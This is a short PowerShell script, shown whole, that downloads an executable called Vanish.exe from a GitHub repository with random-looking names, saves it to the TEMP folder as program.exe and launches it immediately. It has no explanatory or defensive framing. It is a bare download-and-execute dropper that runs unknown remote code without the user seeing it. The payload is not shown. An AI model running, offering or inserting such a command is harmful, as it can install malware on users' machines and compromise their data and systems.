$url = "https://raw.githubusercontent.com/fasa3e/kjnkl-kn-kl/refs/heads/main/Vanish.exe"
$output = "$env:TEMP\program.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
